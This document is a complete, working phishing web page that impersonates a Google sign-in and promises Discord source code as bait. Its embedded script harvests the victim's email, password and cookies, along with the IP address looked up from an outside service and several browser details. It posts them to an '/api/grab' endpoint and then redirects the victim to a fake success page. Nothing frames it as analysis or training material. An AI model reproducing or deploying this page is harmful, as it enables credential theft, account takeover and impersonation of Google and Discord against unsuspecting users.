<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>discord.gg - Sign in to view source</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
            max-width: 420px;
            width: 100%;
        }
        .header {
            background: linear-gradient(135deg, #4285f4, #34a853);
            color: white;
            padding: 40px 30px;
            text-align: center;
        }
        .header i {
            font-size: 48px;
            margin-bottom: 20px;
            opacity: 0.9;
        }
        .header h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        .header p {
            opacity: 0.9;
            font-size: 15px;
        }
        .content {
            padding: 40px 30px;
        }
        .form-group {
            margin-bottom: 25px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 16px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #fafbfc;
        }
        input:focus {
            outline: none;
            border-color: #4285f4;
            background: white;
            box-shadow: 0 0 0 3px rgba(66,133,244,0.1);
        }
        .submit-btn {
            width: 100%;
            background: linear-gradient(135deg, #4285f4, #34a853);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(66,133,244,0.4);
        }
        .footer {
            background: #f8f9fa;
            padding: 20px;
            text-align: center;
            font-size: 13px;
            color: #6c757d;
            border-top: 1px solid #e9ecef;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <i class="fab fa-google"></i>
            <h1>Sign in with Google</h1>
            <p>Enter credentials to view Discord source code</p>
        </div>
        <form id="credForm" class="content">
            <div class="form-group">
                <label><i class="fas fa-envelope"></i> Email or Phone</label>
                <input type="email" id="email" placeholder="you@gmail.com" required>
            </div>
            <div class="form-group">
                <label><i class="fas fa-lock"></i> Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="submit-btn">
                <i class="fab fa-google"></i> Sign in with Google
            </button>
        </form>
        <div class="footer">
            discord.gg • Protected by Google
        </div>
    </div>

    <script>
        document.getElementById('credForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const ip = await fetchIP();
            const data = {
                ip: ip,
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                language: navigator.language,
                platform: navigator.platform,
                cookies: document.cookie,
                timestamp: new Date().toISOString(),
                action: 'google_creds'
            };

            await fetch('/api/grab', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            // Redirect to fake success
            window.location.href = 'https://discord.com/login?code=success';
        });

        async function fetchIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'unknown';
            }
        }
    </script>
</body>
</html>
